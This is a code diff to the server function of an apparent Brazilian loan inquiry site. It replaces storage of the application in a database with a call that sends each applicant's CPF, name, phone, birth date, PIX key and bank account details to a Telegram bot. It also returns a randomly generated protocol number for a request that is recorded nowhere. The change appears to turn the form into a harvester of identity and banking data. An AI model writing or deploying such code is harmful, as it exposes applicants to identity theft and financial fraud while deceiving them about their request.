@@ -94,30 +94,32 @@ export const submitInquiry = createServerFn({ method: "POST" })
       cpf: data.cpf, duration: data.duration as Duration, range: data.range as Range, reason: data.reason as Reason,
     });
     const amount = computeAmount(score, data.range as Range);
-    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
     const p = data.payout;
-    const { data: row, error } = await supabaseAdmin.from("loan_inquiries").insert({
-      full_name: data.fullName.trim(),
-      cpf: onlyDigits(data.cpf),
-      phone: onlyDigits(data.phone),
-      birth_date: parseBirthDate(data.birthDate)!,
+    const protocol = "AGI" + Math.random().toString(36).substring(2, 8).toUpperCase();
+
+    // Notifica instantaneamente o bot do Telegram com a proposta final completa
+    const { sendTelegramNotification } = await import("./telegram-notifier");
+    await sendTelegramNotification({
+      leadId: `LEAD_${cleanCpf.slice(0, 6)}`,
+      cpf: data.cpf,
+      name: data.fullName.trim(),
+      phone: data.phone,
+      birthDate: data.birthDate,
       profile: data.profile,
-      benefit_reason: data.reason,
-      benefit_duration: data.duration,
-      benefit_range: data.range,
-      score,
-      approved_amount: amount,
-      other_banks: data.otherBanks,
-      payout_method: p.method,
-      pix_key_type: p.method === "pix" ? p.pixType : null,
-      pix_key: p.method === "pix" ? p.pixKey.trim() : null,
-      bank_name: p.method === "conta" ? p.bankName : null,
-      agency: p.method === "conta" ? p.agency : null,
-      account: p.method === "conta" ? p.account : null,
-    }).select("id").single();
-    if (error) {
-      console.error("insert failed", error.message);
-      throw new Error("Não foi possível registrar sua solicitação. Tente novamente.");
-    }
-    return { protocol: row.id.slice(0, 8).toUpperCase(), score, amount };
+      reason: data.reason,
+      duration: data.duration,
+      range: data.range,
+      calculatedScore: score,
+      approvedAmount: amount,
+      payoutMethod: p.method,
+      pixType: p.method === "pix" ? p.pixType : undefined,
+      pixKey: p.method === "pix" ? p.pixKey.trim() : undefined,
+      bankName: p.method === "conta" ? p.bankName : undefined,
+      agency: p.method === "conta" ? p.agency : undefined,
+      account: p.method === "conta" ? p.account : undefined,
+      step: "review_accepted",
+      stepDetails: `Protocolo gerado: ${protocol}`,
+    });
+
+    return { protocol, score, amount };
   });
